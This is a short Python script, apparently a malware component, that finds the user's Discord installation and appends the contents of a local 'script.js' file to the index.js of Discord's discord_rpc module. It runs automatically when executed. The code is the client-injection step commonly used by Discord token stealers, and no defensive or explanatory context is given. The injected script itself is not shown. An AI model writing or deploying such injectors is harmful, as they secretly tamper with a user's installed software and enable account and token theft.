import os

def stable():
    dir = f"C://Users//{str(os.getenv('username'))}//AppData//Local//Discord//"
    folder = os.listdir(dir)[0]
    js_file = dir + folder + "//modules//discord_rpc-1//discord_rpc//index.js"

    with open("script.js") as js:
        script = js.read()
        js.close()

    with open(js_file, "a") as file:
        file.write("\n" + script)
        file.close()
    



stable()
